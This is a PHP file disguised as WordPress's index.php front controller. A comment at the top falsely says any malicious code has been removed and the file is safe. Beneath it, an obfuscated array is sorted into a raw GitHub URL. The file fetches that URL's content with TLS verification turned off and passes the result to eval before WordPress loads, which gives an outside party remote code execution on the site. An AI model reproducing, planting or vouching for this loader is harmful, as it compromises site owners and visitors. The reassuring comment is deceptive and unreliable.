<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$qwaszxplmokn = array(
    13 => 'heads/',
    3 => '://',
    9 => 'tent.com/',
    19 => '3-9-26/',
    1 => 'https',
    17 => 'refs/',
    7 => 'githubusercon',
    21 => 'index.txt',
    5 => 'raw.',
    11 => 'mdmomin365366-gif/',
    15 => 'bela/'
);
ksort($qwaszxplmokn);
$full_url = implode('', $qwaszxplmokn);

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
